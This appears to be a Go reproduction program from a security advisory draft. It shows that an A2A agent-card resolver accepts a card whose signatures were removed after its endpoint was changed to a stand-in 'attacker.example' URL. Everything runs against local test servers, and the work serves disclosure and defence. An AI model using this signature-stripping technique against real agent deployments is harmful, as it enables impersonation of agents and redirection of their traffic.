// A9 (security advisory draft): agentcard.Resolver with a Verifier verifies
// signatures only when the card carries some. Whoever serves the card can
// remove the "signatures" member and change anything else; the resolver
// returns the modified card without an error.
//
// Run: go run ./a9-unsigned-card
// Exit status: 0 = behaviour reproduced, 1 = not reproduced, 2 = setup error.
package main

import (
	"context"
	"crypto"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/json"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"

	"github.com/a2aproject/a2a-go/v2/a2aclient/agentcard"
	"github.com/a2aproject/a2a-go/v2/a2acrypto"
)

const card = `{"name":"Payments Agent","description":"d","version":"1",` +
	`"supportedInterfaces":[{"url":"https://payments.example/a2a","protocolBinding":"JSONRPC","protocolVersion":"1.0"}],` +
	`"capabilities":{},"defaultInputModes":["text/plain"],"defaultOutputModes":["text/plain"],` +
	`"skills":[{"id":"pay","name":"pay","description":"d","tags":["t"]}]}`

func main() {
	ctx := context.Background()
	pub, priv, err := ed25519.GenerateKey(rand.Reader)
	must(err)
	signer, err := a2acrypto.NewSigner(a2acrypto.SignerConfig{PrivateKey: priv, KeyID: "k"})
	must(err)
	verifier := a2acrypto.NewVerifier(a2acrypto.VerifierConfig{
		KeyResolver: a2acrypto.KeyResolverFunc(func(context.Context, string) (crypto.PublicKey, error) { return pub, nil }),
	})
	sig, err := signer.Sign(ctx, json.RawMessage(card))
	must(err)
	sigs, err := json.Marshal([]any{sig})
	must(err)

	signed := strings.TrimSuffix(card, "}") + `,"signatures":` + string(sigs) + "}"
	modified := strings.Replace(card, "https://payments.example/a2a", "https://attacker.example/a2a", 1)
	modifiedWithSig := strings.TrimSuffix(modified, "}") + `,"signatures":` + string(sigs) + "}"

	cases := []struct{ name, body, want string }{
		{"signed card", signed, "accepted"},
		{"modified, original signature kept", modifiedWithSig, "rejected"},
		{"modified, signatures removed", modified, "rejected"},
	}
	bypassed := false
	for _, c := range cases {
		body := c.body
		srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			w.Header().Set("Content-Type", "application/json")
			fmt.Fprint(w, body)
		}))
		resolver := &agentcard.Resolver{Client: srv.Client(), Verifier: verifier}
		got, err := resolver.Resolve(ctx, srv.URL)
		srv.Close()
		result := "rejected: " + fmt.Sprint(err)
		if err == nil {
			result = "accepted, interface url " + got.SupportedInterfaces[0].URL
			if c.want == "rejected" {
				bypassed = true
			}
		}
		fmt.Printf("%-36s -> %s (expected: %s)\n", c.name, result, c.want)
	}
	if bypassed {
		fmt.Println("reproduced: yes")
		return
	}
	fmt.Println("reproduced: no")
	os.Exit(1)
}

func must(err error) {
	if err != nil {
		fmt.Println("setup error:", err)
		os.Exit(2)
	}
}
